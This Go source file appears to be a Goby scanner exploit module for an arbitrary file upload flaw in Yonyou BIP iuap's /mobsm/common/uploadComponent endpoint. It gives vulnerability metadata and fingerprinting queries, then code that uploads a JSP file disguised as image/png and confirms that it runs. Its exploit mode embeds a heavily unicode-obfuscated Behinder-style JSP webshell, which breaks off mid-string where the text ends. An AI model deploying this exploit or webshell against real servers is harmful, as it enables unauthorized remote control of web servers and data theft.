package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "YonyouBIP iuap platform  /mobsm/common/uploadComponent File Upload Vulnerability",
    "Description": "<p>The Yonyou BIP iuap platform is developed by Yonyou Corporation, integrating cloud computing, mobile, big data, social, and other technologies. It is a fully Internet-based enterprise Internet development platform.</p><p>The Yonyou BIP iuap platform's \"/mobsm/common/uploadComponent\" interface has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability to upload malicious script files, gain server permissions, and subsequently control the entire web server.</p>",
    "Product": "Yonyou BIP iuap platform",
    "Homepage": "https://iuap.yonyou.com/",
    "DisclosureDate": "2024-03-25",
    "PostTime": "2024-03-27",
    "Author": "2783712916@qq.com",
    "FofaQuery": "(body=\"/js/licensepatternCtr.js\" && body=\"/js/licenseviewCtr.js\") || body=\"/mobsm/html/index.jsp\" || body=\"js/jslib/respond.src.js\" || body=\"/mobsm/login/home\"",
    "GobyQuery": "(body=\"/js/licensepatternCtr.js\" && body=\"/js/licenseviewCtr.js\") || body=\"/mobsm/html/index.jsp\" || body=\"js/jslib/respond.src.js\" || body=\"/mobsm/login/home\"",
    "Level": "3",
    "Impact": "<p>The Yonyou BIP iuap platform's \"/mobsm/common/uploadComponent\" interface has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability to upload malicious script files, gain server permissions, and subsequently control the entire web server.</p>",
    "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "{{{rand|str|10}}}.jsp",
            "show": "attackType=custom"
        },
        {
            "name": "custom",
            "type": "textarea",
            "value": "<% out.println(\"checkString\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "HW-2023"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "用友BIP iuap平台  /mobsm/common/uploadComponent 文件上传漏洞",
            "Product": "用友BIP iuap平台",
            "Description": "<p>用友BIP iuap平台是用友公司结合云计算、移动、大数据、社交等技术研制的，完全基于互联网架构的企业互联网开发平台。<br></p><p>用友BIP iuap平台&nbsp;/mobsm/common/uploadComponent接口存在任意文件上传漏洞，攻击者通过该漏洞上传恶意脚本文件，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1.联系相关厂商，获取安全补丁，及时进行漏洞修复&nbsp;</p><p>2.联系相关安全厂商，及时更新安全阻断策略<br></p>",
            "Impact": "<p>用友BIP iuap平台&nbsp;/mobsm/common/uploadComponent接口存在任意文件上传漏洞，攻击者通过该漏洞上传恶意脚本文件，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "YonyouBIP iuap platform  /mobsm/common/uploadComponent File Upload Vulnerability",
            "Product": "Yonyou BIP iuap platform",
            "Description": "<p>The Yonyou BIP iuap platform is developed by Yonyou Corporation, integrating cloud computing, mobile, big data, social, and other technologies. It is a fully Internet-based enterprise Internet development platform.</p><p>The Yonyou BIP iuap platform's \"/mobsm/common/uploadComponent\" interface has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability to upload malicious script files, gain server permissions, and subsequently control the entire web server.</p>",
            "Recommendation": "<p>1. Contact the relevant vendor to obtain security patches and promptly perform vulnerability repairs.</p><p>2. Contact relevant security vendors to promptly update security blocking strategies.</p>",
            "Impact": "<p>The Yonyou BIP iuap platform's \"/mobsm/common/uploadComponent\" interface has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability to upload malicious script files, gain server permissions, and subsequently control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	//检测
	sendGetHttpXsdsd1223Asw := func(hostInfo *httpclient.FixUrl, urlPath string) bool {
		httpConfig := httpclient.NewGetRequestConfig(urlPath)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return false
		}
		if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "checkStringAAAAAAAAAA") {
			return true
		}
		if strings.Contains(urlPath, "/mobsm/uploadComponent/") {
			if resp.StatusCode == 200 && resp.StatusCode == 500 {
				return true
			}
		}
		return false
	}

	sendPostHttpXjhd6387Yu := func(hostInfo *httpclient.FixUrl, urlPath string) bool {
		httpConfig := httpclient.NewPostRequestConfig(urlPath)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryKHkOWUqIbrd70gMN")
		filename := goutils.RandomHexString(10) + ".jsp"
		body := "------WebKitFormBoundaryKHkOWUqIbrd70gMN\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\nContent-Type: image/png\r\n\r\n<% out.println(\"checkStringAAAAAAAAAA\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n------WebKitFormBoundaryKHkOWUqIbrd70gMN--"
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return false
		}
		if resp.StatusCode == 200 && resp.Utf8Html == "ok" {
			return sendGetHttpXsdsd1223Asw(hostInfo, "/mobsm/uploadComponent/"+filename)
		}
		return false
	}

	//利用
	expGetHttpXhd64hgdw := func(hostInfo *httpclient.FixUrl, urlPath string) bool {
		httpConfig := httpclient.NewGetRequestConfig(urlPath)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return false
		}
		if resp.StatusCode == 200 || resp.StatusCode == 500 {
			return true
		}
		return false
	}
	expPostHttpXjhd6387Yu := func(hostInfo *httpclient.FixUrl, urlPath string, filename string, content string) bool {
		httpConfig := httpclient.NewPostRequestConfig(urlPath)
		httpConfig.VerifyTls = false
		httpConfig.FollowRedirect = false
		httpConfig.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryKHkOWUqIbrd70gMN")
		body := "------WebKitFormBoundaryKHkOWUqIbrd70gMN\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + filename + "\"\r\nContent-Type: image/png\r\n\r\n" + content + "\r\n------WebKitFormBoundaryKHkOWUqIbrd70gMN--"
		httpConfig.Data = body
		resp, err := httpclient.DoHttpRequest(hostInfo, httpConfig)
		if err != nil {
			return false
		}
		if resp.StatusCode == 200 && resp.Utf8Html == "ok" {
			return expGetHttpXhd64hgdw(hostInfo, "/mobsm/uploadComponent/"+filename)
		}
		return false
	}

	checkVulXerd1237n := func(hostInfo *httpclient.FixUrl) bool {
		return sendPostHttpXjhd6387Yu(hostInfo, "/mobsm/common/uploadComponent")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ss.VulURL = hostinfo.FixedHostInfo + "/mobsm/common/uploadComponent"
			return checkVulXerd1237n(hostinfo)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//获取传递过来的参数
			attackType := goutils.B2S(ss.Params["attackType"])
			filename := goutils.B2S(ss.Params["filename"])
			content := goutils.B2S(ss.Params["custom"])
			//判断攻击方式
			if attackType == "behinder" {
				filename = goutils.RandomHexString(10) + ".jsp"
				content = `<%!//\uuu000a\uuuuuu0020\uuuuuu0070\uuuuuu0075\uuuuuuuuuu0062\uuuuuuuuu006c\uuuuuuuu0069\uuuuuuu0063\uu0020\uuuuuu0062\uuuuuuuuuu0079\uuuuuuuuuu0074\uuuu0065\uuuuu005b\uuu005d\uuu0020\uuu0041\uuu0033\uuuuuuu0034\uuuuuuuuu0056\uuuuu0072\uu0028\uuuuuuuuuu0053\u0074\uuu0072\uuuuuuuuu0069\u006e\uu0067\uuuuuu0020\uuuuu0053\uuuuuuu0074\u0072\uuuuuuuuu0069\uuuuuu006e\uuuuuuuu0067\uuuuuuuu0073\uuuuu002c\u0053\uuuuuu0074\u0072\uuuu0069\uuuu006e\uuuuuuuuu0067\uuuu0020\uu006b\uu0029\u0020\uuuuuuuuuu0074\uuuu0068\uu0072\u006f\uuuuuuu0077\uuuuu0073\u0020\uuuuu0045\uuuuuuu0078\uu0063\uuuuuuuuuu0065\uuuuuuuu0070\uuuuuuuuuu0074\uuuuuuuu0069\uuuu006f\uuu006e\uuuuu0020\uu007b\uuu0020\uuuuuu006a\uuuuuuuuuu0061\uuuuuu0076\uuuuu0061\uu0078\uuuuuuuuuu002e\uuuuuuuuu0063\uuuuuuuu0072\uuuuuuu0079\u0070\uuuu0074\uuuuuuuuuu006f\uuuuuuuuuu002e\uuuuu0043\uuuuuuuuu0069\uuuuuu0070\uuuuuuuuu0068\uuuuu0065\u0072\uuuuuuuuuu0020\uuuuuuuuu0042\uuuuuuuuu0074\uuuuuuuuu0073\uuuuuu0078\uuuuuuuu0034\uuuuu0055\u0020\u003d\uuuuuuuuu0020\uuuuuuuuuu006a\u0061\uuuuuu0076\uuu0061\uuuuuu0078\uuuuu002e\uu0063\uuu0072\uu0079\uuuuuuuuuu0070\uuuuuu0074\uuuuuuuuu006f\uu002e\uuuuuuuuu0043\u0069\uuu0070\u0068\uuuuuuu0065\uuuuuuuuu0072\u002e\uuuuuuu0067\uuuuuuuu0065\uuuuu0074\uuuuuuu0049\uuuuu006e\u0073\uuuuuuuuu0074\u0061\uuuu006e\uuuuuuuu0063\uu0065\uuuuuu0028\u0022\uuuuuu0041\uu0045\uuuu0053\uuuuuuu002f\uuuuuu0045\uuu0043\uuuuuuuuuu0042\uu002f\uuuuu0050\u004b\uuuuu0043\uu0053\uu0035\uuuuuuuuuu0050\uuuuuuu0061\uu0064\uuuu0064\uuuuuu0069\uuuuuuuuuu006e\uuu0067\u0022\uuuuuuu0029\uuuuuuuu003b\uuuuuuuu0042\uuuuu0074\uuuu0073\u0078\uuu0034\uu0055\uuuu002e\uuuuu0069\uuuuuu006e\u0069\uuuuuuuu0074\uu0028\uuuuuuuuuu006a\uuuuuu0061\uuuu0076\uuuuuuuu0061\uuuuuuuuu0078\uuuuuuu002e\u0063\uuuuuu0072\uuuuu0079\uuuuu0070\uuuuuuuuuu0074\uuuuuuu006f\uuuuuuuuuu002e\uu0043\uuu0069\uuuu0070\uuuuuuu0068\uu0065\uuuuuuuuuu0072\uuuuuuu002e\uuuuuu0044\uu0045\uuuuuuuuu0043\uuuuuuuuu0052\uuuuuuu0059\uuuuuuuuuu0050\uuuuu0054\uuuuuu005f\u004d\uuuuu004f\uuuuuuu0044\uuuuuuuuu0045\uuuuuu002c\uuuuuuu0020\u0028\uuuuuuuuuu006a\uuuuuuuuu0061\uuuuuu0076\uuuuuuuu0061\uuuuu0078\uuuuu002e\uuuuuuu0063\uuuuuuuu0072\uuuuu0079\uu0070\uuuuuuu0074\uuuuuuuu006f\uuuuuu002e\uuuuuuuuuu0073\uuuuuu0070\uuu0065\uuu0063\uuuuuuu002e\uuuuuuuuuu0053\uuuuu0065\uuuuu0063\uuuuuu0072\u0065\uu0074\uu004b\uuuu0065\uuuuuuuu0079\uuu0053\uuuuuuuu0070\uuuuuuuuu0065\uuuu0063\uuuuuuuu0029\u0020\uuuuuu0043\uuuuuuuuu006c\uu0061\uuuuuuuuuu0073\uuuuuuuuuu0073\uuuuuuu002e\u0066\uuuuu006f\uuu0072\uuuuu004e\uuuuuu0061\uuuu006d\uuuuuuu0065\uuuuuuuu0028\uuu0022\uuuuuu006a\uuuuuuuu0061\uu0076\uuu0061\uuuuuuu0078\u002e\uuuuuuuuuu0063\uuuuuu0072\uuuuuuu0079\uuuuuuuu0070\uuu0074\uuuuuu006f\uuuuuuuuuu002e\uu0073\uuuuu0070\uuuuu0065\uuuuuuu0063\uuuuu002e\uuuuuuuuu0053\uuuuu0065\uuuuuuuuuu0063\uuu0072\uu0065\uuuuuuuuuu0074\uuuu004b\uuuuuuuuu0065\u0079\uuuuuuu0053\uuuuu0070\uuuu0065\uuuuuuuuuu0063\uuuuu0022\uuu0029\uuuu002e\uuuuuuuuu0067\uuuuuuuuu0065\uuuuuu0074\uuuuu0043\uuuuuuuuuu006f\uuuuuu006e\uuuuuu0073\uuuuuuu0074\uuuuuuuu0072\u0075\uuuuuuuuu0063\uuuuu0074\u006f\uuuuuuu0072\uuuuuuuuu0028\uuuuuu0062\u0079\uu0074\u0065\uu005b\uuuuuuuuu005d\u002e\u0063\u006c\uuu0061\uuuu0073\uuuuu0073\u002c\u0020\uuuuuuu0053\uuu0074\uuuuu0072\uuuuuuuu0069\uuu006e\uuuu0067\uuuu002e\uu0063\uuuuu006c\uuuuu0061\uuuuuu0073\uuu0073\uuuuuuuuu0029\u002e\uuuu006e\uuuuu0065\uuuuu0077\uuuu0049\u006e\uuuu0073\uu0074\uuuu0061\uuuu006e\uuuuu0063\uuuuu0065\uuu0028\uuuuuu006b\u002e\uuuuuu0067\uuuuuuuuuu0065\uu0074\uuuuu0042\uuuuu0079\uuuu0074\uuuuuu0065\uuuuuu0073\uuuuu0028\uuuu0029\uuuuuuuuu002c\uu0020\uuuuuuuuu0022\uu0041\uuuuuu0045\uuuuuu0053\uuuuuuuuuu0022\uuuuuuuuuu0029\uuuuuuuuu0029\u003b\uuuuuuuuu0062\uuuuuuu0079\uuu0074\uuuuuuuu0065\uuu005b\uuuuuuu005d\uuuuuuuuu0020\uuu0062\uuuuuuuuuu0079\uuuuuuuu0074\uuuuuuuu0065\uuuuuuu0073\uuuuu003b\uuuuuuuuu0074\uuuuuuuuuu0072\uuuuuuu0079\uuuuu007b\uuuuuuuuuu0069\uu006e\uuuuuuuuuu0074\uuu005b\uuuuuuuuu005d\u0020\uuuuuuuuu0061\uuuuuuuuuu0061\uuuuu0020\uuuuuuuuuu003d\uuuuuuuu0020\uuuuuuuuu006e\uuu0065\uuuuuuu0077\uuuu0020\uuu0069\uuuuuuuuuu006e\uuuuuuuuu0074\uuuu005b\uuuuuuu005d\uu007b\uuuuuu0031\uu0032\uuu0032\uuuuuuuu002c\uuuuuu0020\uuuuuuu0031\u0031\uuuuuuu0033\uuuu002c\uuuuuu0020\uuuuuu0031\uuuuuuuuuu0030\uuuuu0032\uuuuu002c\uuuuuu0020\uuuu0031\uuuuuuuuuu0031\uuuuuuuuu0033\uuuuuuuuu002c\uuuuuuuu0020\uuuuuuuu0036\uuuuu0032\uuuuuuuuu002c\uuuuu0020\uuu0031\uuuuuuuuuu0030\uuuuuuuu0031\uuuuu002c\uuuuuu0020\uuuu0031\uuuuuuu0030\uuuuuuuuuu0030\uuuu002c\uuuu0020\uuuuuuuu0031\uuuuuu0032\uuuuu0031\uuu002c\uuu0020\uuuuuuu0031\uuuuuu0032\uuuuuuuuu0034\uuu002c\uuuu0020\uuuuuuu0036\uuuuuuuuuu0032\u002c\uu0020\uuuuuuuuu0038\uuuuu0032\uuuuu002c\uuuuuuuu0020\uuuu0031\uuuuuuuuuu0031\uuuuuu0033\uuuuuuuuu002c\uuu0020\uuuuuu0039\uuuuu0039\uuuuuu002c\uuuuuuuuu0020\uuuuuuuuuu0031\u0031\uuuuuuuuu0037\u002c\uu0020\uu0033\uuuuuuuu0038\uuuuuuu002c\uuuuuuu0020\uuuuuu0033\uu0036\uuuu007d\uuuu003b\uuuuuuuuu0053\uuuuuuuu0074\uuuuuu0072\uuuuuuuuuu0069\uu006e\uu0067\uuuu0020\u0063\uuu0063\uuuuuuuuuu0073\uuuuuuu0074\uuuuuu0072\uuuuuuuu0020\uuuuu003d\uu0020\uuuuuuu0022\uuuu0022\uuuu003b\uuuuu0066\uuuu006f\uuuuu0072\u0020\uuuuuuu0028\uuuu0069\uuuuuuuuuu006e\u0074\uuuuuu0020\uuuuuu0069\uuuuuuuu0020\uuuuuu003d\uuuuuuuuu0020\uuuuuuu0030\uuuu003b\uuu0020\uuuuuuu0069\uuuuuuuuuu0020\uuuuuuuu003c\uuuu0020\uuuu0061\uuuuuuu0061\uuuuuuuu002e\uuuuuu006c\uuuuuuuuu0065\uuuuuuuu006e\uuuuuu0067\uuuuuuuuu0074\uuuuuuuu0068\uuuuuuuu003b\uuu0020\uuuuuuuuu0069\uuuuuuu002b\uuu002b\uuuuuu0029\uuuuuu0020\uuuuuuuuu007b\uu0020\uuuuuuu0061\uuuuuuuuuu0061\uuuuuuuuu005b\uuuuuu0069\uuuuu005d\u0020\uuuuuuuuuu003d\uuuu0020\uuuuu0061\uuuuuuuuuu0061\uu005b\uuuuuuuuuu0069\uuuuuuu005d\uuu0020\uuuuuuuuu005e\uuuuu0020\u0031\uuuu0036\uuuuuuu003b\uuuuuuuu0020\uuu0063\uu0063\uuuuuuu0073\uuuuuuuuu0074\uuu0072\uuuuuu0020\uuuuuuuu003d\u0020\uuuuuuuu0063\uuuuuuuuu0063\uuu0073\uuuu0074\uuuuuuuuuu0072\uuuu0020\uuuuuu002b\uuuuuuuuuu0020\uuuuuuuu0028\uu0063\uu0068\uuuuuuuuu0061\uuuuuuu0072\uu0029\u0020\uuuuuu0061\uuuuuuuuuu0061\uu005b\uuuuuu0069\uu005d\uuuuu003b\uuuuu007d\uuuuu0043\uuuuuuuu006c\uuuuuuuuuu0061\uuuuuuuuuu0073\uuuuuuuuuu0073\uu0020\u0063\uuuuu006c\uuuuuuu0061\uuuuuuu007a\uuuuu007a\uuuuu0020\u003d\uuuuuuuuu0020\uuuuuuuu0043\uuuuuuu006c\u0061\uuuuuuu0073\uuuuuuuuuu0073\uuuuuuu002e\uuuuuuuuu0066\uuuuuu006f\uuu0072\uuuu004e\u0061\uuuuuuu006d\uuuuuuu0065\uuuuuuuuu0028\uuuuuu0063\uuuuuuuu0063\uuuuuu0073\uuuuuuuu0074\uuuuu0072\uu0029\uuuuuu003b\u0020\u004f\uuuuuuu0062\uuuuuuuuu006a\uuuuuuuu0065\uuuuuu0063\uuuuuuu0074\uuuuuuuuu0020\uuuu0064\uuuuuuuuu0065\uuuuuu0063\uuuuuu006f\uu0064\uuuuuuu0065\uu0072\uuuuu0020\uuuuu003d\uuuuuuuuu0020\uuuuuuuuuu0063\uuuu006c\uuuuu0061\uu007a\uuuuuuuu007a\uuuuuuuuuu002e\uuuuuuuu0067\uuuu0065\uuuuuuu0074\uuuuu004d\uuuuuuu0065\uuuuuuu0074\uuuuuu0068\uu006f\uuuuu0064\uuu0028\uuuu0022\uuuuuuuuuu0067\uuu0065\uu0074\uuuuuuuuuu0044\uuuuuuuuu0065\uu0063\uuuuuuuuuu006f\uuu0064\uuuuuuuuuu0065\uuuuuuuuu0072\uu0022\uuu0029\uuuuuuuuu002e\uuuuu0069\uuuuuuuu006e\uuuuuuuuuu0076\uuuuuu006f\uuuuuuuuu006b\uuuuuu0065\uuuuuuuuu0028\u006e\uuu0075\uuuuu006c\uuuuuu006c\uuuuuuuuu0029\uuuuuuu003b\uuuuuu0062\uuuuuuu0079\uuuuuuu0074\uuuuuuuuuu0065\uuuuu0073\uuuu0020\uuuuuu003d\uu0020\uuuuuuu0020\uuuuuuuu0028\uuu0062\uuuuu0079\u0074\uuuuuuuuu0065\uuuuu005b\uuu005d\u0029\uuu0020\uuuuuuuuuu0064\uuuu0065\uuuuuuu0063\uuu006f\uuuuuuuu0064\uuuuuuu0065\uuuuuu0072\uuuuuuuuuu002e\uuuuu0067\uuu0065\uuuuu0074\uuuuuu0043\uuuuuu006c\uuuuu0061\uuuuuuuuuu0073\uuuuuu0073\uuuuuuuuuu0028\uu0029\uuuuuuuuuu002e\u0067\uuuuu0065\uuuuuuu0074\uuu004d\uuuuuuu0065\u0074\uuu0068\uuuu006f\uuu0064\uuuu0028\uuuuuuuuuu0022\uuuuuuuu0064\uuuuuuuu0065\uuuu0063\uuuuu006f\uuuuuuu0064\u0065\uuuuuuuuu0022\uuu002c\uu0020\uu0053\uuuuuuuu0074\uuuuuuuuu0072\uuuuuuuu0069\uuuu006e\uuuuuuuu0067\uuuuuu002e\uuuuuuuuu0063\uu006c\uu0061\uuuuuuu0073\uuuuuu0073\uuuuuu0029\uuuuuuuu002e\u0069\u006e\uuuuu0076\uuuuuuuuu006f\uuuu006b\u0065\uu0028\uuuuuu0064\uuuuuuuu0065\uuuuuuuuuu0063\uuuuuu006f\uuuuuuuuuu0064\uuuu0065\uuuuuuuuu0072\uuuuuuuuu002c\u0020\uuuuu0053\uu0074\uuuu0072\uuuu0069\u006e\uuuuuu0067\uuuuuuuuu0073\uuuuuuuuu0029\uuuuuu003b\uu007d\uuuuuuuuu0063\uuuu0061\uuuuuuuuu0074\u0063\uuuu0068\uuuu0020\uuuuuu0028\uuuuu0054\uuuuuuuuuu0068\uuu0072\uuu006f\u0077\uuuuuuu0061\u0062\uuuuuuuuu006c\uuuuuu0065\uuu0020\u0065\uuuuuuuu0029\uuuuuu007b\uuuu0069\uuuuuuuuu006e\uuuuuuuuuu0074\uuuuuuuuuu005b\uu005d\uuuuuu0020\uuuuu0061\uuuuuuuuuu0061\uuuuuuuuu0020\uuuuuu003d\uu0020\uuuu006e\uuuuuuuu0065\uuuuuuu0077\uuuuuuuuu0020\uuuuuuu0069\u006e\uuuuuu0074\uuu005b\uuuuuuuuuu005d\uuuuuuuuuu007b\uuuuuuuuuu0039\u0039\u002c\uuuuu0020\uuuuuuuu0031\uuuuuuuuuu0030\u0031\uuuuuuuu002c\u0020\uuuu0031\uuuu0032\uuuuuu0036\uuuuu002c\uuuuuuuuu0020\uuu0036\uuuuuuuuu0032\u002c\uuuuuuuuuu0020\uuuuuuuuu0031\uuuuuuuuu0032\uuu0035\uuuuuu002c\uuuuu0020\uuuuuuuuu0031\uuu0032\uu0031\uuuuuuu002c\uu0020\uuuuuu0039\uuu0039\uuuuuuuu002c\uuuu0020\uu0031\uu0031\uuuuuuuu0035\uu002c\u0020\uuuuuuuu0036\uuuu0032\uuuuuuu002c\u0020\uuuu0038\uuuuuuuu0032\uu002c\uuuu0020\uu0038\uuuuuu0031\uuuuuuuu002c\uuu0020\uuu0036\uuuu0037\uuuu002c\uuuuu0020\uuuuuu0038\u0035\uuuuuuuuu002c\uuuuuuuuu0020\uuuuuu0033\u0038\uuu002c\u0020\uuuuuuuuu0033\uuuuuuu0036\uuuuu002c\uuuuuu0020\uuuuuuuu0038\uuuu0034\uuuu002c\uuuuuu0020\uuuuu0031\uuuuuuuuuu0031\uu0037\uuuuuuuuuu002c\uuu0020\uuuu0031\uuuuuuuu0031\uuuuuuuu0035\uuuuuuuu002c\uuuuu0020\uuu0031\uuuuuuuuu0032\uuuuuuu0037\uuuuuuu002c\uuuuu0020\uuuu0031\uuuuuuuuuu0031\uuuuuuuuu0036\uuuuuuuuuu002c\uuuuuuuuuu0020\uu0031\uuuuuuuuu0031\uuuuu0037\uuuuu002c\uuuuuuuuuu0020\u0039\uuuuu0038\uuu007d\uuuuuuuu003b\u0053\uuu0074\uuuuuuuuu0072\uuuuu0069\uuuuuuuu006e\uuuuuuuu0067\uuuu0020\uuuu0063\uuuuuuuuu0063\uuuuuuuuu0073\uuuuuuu0074\uuuuuu0072\uuu0020\uuuuuuuuuu003d\uuuuuuu0020\uu0022\uuuuuuuuu0022\uuuuuuuuu003b\uuuuuu0066\u006f\uuu0072\uuuuuuuuu0020\uuuu0028\uuuu0069\uuuuuuuuu006e\uuuuuuuuuu0074\u0020\uu0069\uuuu0020\uuu003d\uuuu0020\uu0030\uuuuuuu003b\uuuuuuuu0020\uuuuuu0069\uuuuuuuuuu0020\uuuuu003c\uuuuu0020\uuuuuuu0061\uuuuuuu0061\u002e\uuu006c\u0065\uuuuuuu006e\uuu0067\uuuuuuuu0074\uuu0068\uuuuuu003b\uuuuuuu0020\uuuu0069\uuuuuu002b\uuuuuuuu002b\uuuuuuuuu0029\uuuuuuuu0020\uuuuuuu007b\uuu0061\uuuu0061\uuuuuu005b\uuuuuuuu0069\uuuuu005d\uuu0020\uuuuuuuu003d\uuu0020\uu0061\u0061\uuuuuu005b\uuuuuuuu0069\uuuu005d\uuuuu0020\u005e\uuuuuu0020\uu0031\uuuuu0036\uuuuuuu003b\uuuuuuuu0020\uuuuu0063\uuuuuuuu0063\u0073\uuu0074\uuuuuuuuu0072\uuuuu0020\uuuuuu003d\uuuuuuu0020\uuuuu0063\u0063\uuuu0073\uuuuuuuuuu0074\uuuuuuuu0072\uuuuuuu0020\uuuuuuu002b\uuuuuuu0020\uuuuuuuu0028\uuuu0063\uuuuuuu0068\uuuuuuuu0061\uuuuuuuuuu0072\uuuuuuu0029\uuuu0020\uuuuuuuuuu0061\u0061\uu005b\uuuu0069\uuuu005d\uuuuuuuu003b\uuuu007d\uuuuuuuuuu0043\uuuuuu006c\u0061\uuuuuuuu0073\uuuuuuuu0073\uuu0020\uuuuuuu0063\uuu006c\uuuuuuuuu0061\uuuuuuuu007a\uuuuuuuuu007a\uuuuuuuuuu0020\uuuuuu003d\uuuuuu0020\uuuuuu0043\uuu006c\uuuuuuuu0061\uuuuu0073\uuuuuuuu0073\uuu002e\uuuuuuuuuu0066\uu006f\uuuuu0072\u004e\uuuuuuuuu0061\uuuuuuuuu006d\uuuu0065\uuuuu0028\uuuuuuu0063\uuuuu0063\uuuuu0073\uuuuu0074\uuuuuuu0072\uuuuuuuuuu0029\uuu003b\uuuu0062\uuu0079\uuuuuuuu0074\uuuuu0065\u0073\u0020\uuuuu003d\uuuuuuu0020\uuuu0028\uuuuuuuuuu0062\uuuuu0079\uuuuuuuu0074\uuuuuuu0065\uuuuuuuu005b\uuuuuuuu005d\uuuuuuuuuu0029\uuuuu0020\uuuuuuu0063\u006c\uuuuuuuu0061\uuuuuuuuuu007a\uuuuuuuuuu007a\uuuuuuuuuu002e\u0067\u0065\u0074\uu004d\uuuuu0065\uuuuu0074\uuuuuuuuu0068\uuuuuuuuuu006f\uuu0064\uuuuuuuu0028\uuu0022\uuuuuuuuu0064\u0065\uuuuuuuuu0063\uuuuu006f\uu0064\uuuuuuuu0065\u0042\uuuuuuuuuu0075\u0066\uuuuuuuuu0066\u0065\uu0072\uuuuuuuuuu0022\uuu002c\uuu0020\uuu0053\uuuuuuuuu0074\uuuuuuuuu0072\uuuuuuuuuu0069\uuuuuuuuu006e\uuuuuuuuuu0067\uuuuu002e\uuuuuuuuu0063\uu006c\uuuuuuuuuu0061\uuuuuuuuu0073\uuuuuu0073\uuuuuu0029\u002e\uuuuuuuu0069\u006e\uuuuuuuuu0076\uuuuuuu006f\uu006b\uuuuu0065\uu0028\uu0063\uuuuuu006c\uu0061\uuu007a\uuuuu007a\uuuuuuuuuu002e\uuu006e\uuu0065\uuuuuuu0077\uuu0049\uuuuuuuuu006e\u0073\uuuuuu0074\uuuuu0061\uuuuuuu006e\uuuuuu0063\uuuu0065\uuu0028\uuuuuuuuu0029\uuu002c\u0020\u0053\uuuuu0074\u0072\uuuuuuuu0069\uuuuuu006e\uu0067\uuuuuuuuu0073\uuuu0029\uuuuuu003b\uuuuuu007d\uuuuuuu0062\uuuuu0079\uuu0074\uuuuuu0065\u005b\uuuuuuuuu005d\uu0020\uuuuuuuuuu0072\uu0065\uuu0073\uuuuuuuuu0075\uuuuuuuuuu006c\uuuuuu0074\u0020\uuu003d\uuuuuuuu0020\uuu0028\uuuuuuuuu0062\uuuu0079\uuuuuu0074\uuuu0065\uuuuuu005b\uuuuuuuuuu005d\uuuu0029\uuuuu0020\uuuuuuuuu0042\uuuu0074\uuuuuuu0073\uuuuuuuuu0078\uuuuuuuuuu0034\u0055\uu002e\uuuuuuuu0067\uuuuuuu0065\uuuuuu0074\uuuu0043\u006c\uuuuu0061\u0073\uuuu0073\uuuuuuuu0028\uuuuuuu0029\uuuuuuu002e\uuuuuuuuuu002f\uu002a